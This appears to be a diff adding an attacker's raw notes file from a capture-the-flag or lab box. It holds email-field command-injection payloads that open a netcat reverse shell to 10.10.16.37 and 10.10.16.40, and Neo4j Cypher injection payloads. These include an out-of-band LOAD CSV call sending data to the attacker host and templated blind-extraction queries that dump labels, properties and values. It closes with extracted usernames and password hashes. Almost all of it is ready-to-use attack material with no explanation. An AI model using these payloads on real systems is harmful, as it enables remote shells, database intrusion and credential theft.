@@ -1,0 +1,72 @@
+a@10.10.16.37;ls>a.txt;a@a.com
+
+
+a%40a.com%3brm+-f+/tmp/f%3bmknod+/tmp/f+p%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.37+4444+>/tmp/f
+
+
+a@a.com;rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.37 4444 >/tmp/f
+
+a@10.10.16.40;a@a.com;rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.40 4444 >/tmp/f
+
+
+orignial  : MATCH (n) WHERE n.property = '//This is NOT a comment' RETURN n
+
+MATCH (n) WHERE n.property = '' OR 'a'='a' RETURN n
+
+MATCH (n) WHERE n.property = '' OR 1=1//'' RETURN n
+
+'  OR EXISTS{ CALL { WITH 1 AS one RETURN  one} } OR 'a'='a
+'  AND EXISTS{ CALL { WITH 1 AS one RETURN  one} } AND 'a'='a
+
+' OR EXISTS{ CALL { WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'http://10.10.16.40/' + name as _l RETURN 1 } } OR 'a'='a
+
+
+'  AND count {CALL db.labels() YIELD label RETURN label} = 10 AND 'a'='a
+
+'  AND count {CALL db.labels() YIELD label RETURN label} > 10 AND 'a'='a
+
+
+
+
+TOTAL label = 2 
+'  AND count {CALL db.labels() YIELD label RETURN label} = 2 AND 'a'='a
+
+
+Get LAbel Size:
+' AND EXISTS {CALL db.labels() YIELD label WITH label SKIP %index% LIMIT 1 WHERE size(label) = %SIZE% RETURN label} AND 'a'='a
+
+
+GET label:
+' AND EXISTS {CALL db.labels() YIELD label WITH label SKIP %index% LIMIT 1 WHERE substring(label,%CHARACTER_NUMBER%,1) = '%CURRENT_CHARACTER%' RETURN label} AND 'a'='a
+
+
+
+['user', 'employee']
+
+
+Number of Properties of A Label:
+' AND count {MATCH(t:%label%) CALL db.propertyKeys() YIELD propertyKey WITH propertyKey WHERE not isEmpty(t[propertyKey]) WITH distinct propertyKey RETURN propertyKey} = %TotalNumber% AND 'a'='a
+
+Get Propertires Name Size:
+' AND exists {match(t:%label%) call db.propertyKeys() yield propertyKey with propertyKey  where not isEmpty(t[propertyKey]) with distinct propertyKey skip %index% limit 1 where size(propertyKey) = %size% return propertyKey} AND 'a'='a
+
+
+Dump Properties Name:
+' and exists { match(t:%label%) call db.propertyKeys() yield propertyKey with propertyKey where not isEmpty(t[propertyKey]) with distinct propertyKey skip %index% limit 1 where substring(propertyKey,%strIndex%,1)='%CHARACTER%' return propertyKey} and 'a'='a
+
+
+
+
+Number of Keys in A properties of Labels:
+' and count {match(t:%label%) unwind keys(t) as key with key, t where key = '%property%'  return t[key]} = %NUMBER_OF_RESULTS% and 'a'='a
+
+Size of A Key in A property of Label:
+' and exists {match(t:%label%) unwind keys(t) as key with key, t where key = '%property%' with t,key skip %key_index% limit 1 where size(toString(t[key])) = %SIZE_OF_RESULT% return t[key]} and 'a'='a
+
+
+Dump Key:
+' and exists {match(t:%label%) unwind keys(t) as key with key, t where key = '%property%' with t,key skip %key_index% limit 1 where substring(toString(t[key]),%CHARACTER_NUMBER%,1) = '%CURRENT_CHARACTER%' return t[key]} and 'a'='a
+
+
+{'password': ['8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918', 'a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6'], 'username': ['admin', 'john']}
+
